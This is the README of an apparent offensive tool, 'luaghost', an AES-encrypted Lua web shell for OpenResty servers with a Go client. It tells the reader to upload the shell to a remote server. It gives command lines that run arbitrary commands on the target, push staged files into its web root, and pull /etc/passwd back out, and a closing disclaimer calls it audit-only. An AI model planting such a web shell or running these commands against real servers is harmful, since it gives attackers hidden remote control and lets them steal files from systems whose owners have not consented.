# luaghost
Lua WebShell For OpenResty with AES encryption

# Usage

## 1. Upload the server side script to remote server

```lua
aes = require("resty.aes")
str = require("resty.string")
rand = require("resty.random")

-- Change your encryption key here
template_name = "client_heartbeat"
```

## 2. Access the WebShell by using the client

```shell
$ go get -v # Pull the Golang dependencies

$ go run luaghost.go
  -charset string
    	Access key (default "GBK")
  -cmd string
    	Command to execute, or left it bank to upload a file
  -down
    	Download the remote file instead upload file
  -file string
    	Local file you want to upload / saved
  -key string
    	Access key
  -rpath string
    	Remote file path (with the filename, C:\\1.txt etc, double backslash for Windows)
  -url string
    	Target URL
```

For example, execute the command:
```shell
$ go run luaghost.go  -url https://example.com/shell.lua -key client_heartbeat -cmd "whoami"
```

Uploading file to remote server:
```shell
$ go run luaghost.go -url https://example.com/shell.lua -key client_heartbeat -file ~/stage.lua -rpath "/var/www/html/stage.lua"
```

Downloading a file from remote server:
```shell
$ go run luaghost.go -url https://example.com/shell.lua -key client_heartbeat -down -file /tmp/passwd -rpath "/etc/passwd"
```

# Disclaimer

**This tool is used for internal security accessment && audit only. Please obey the laws of your country.**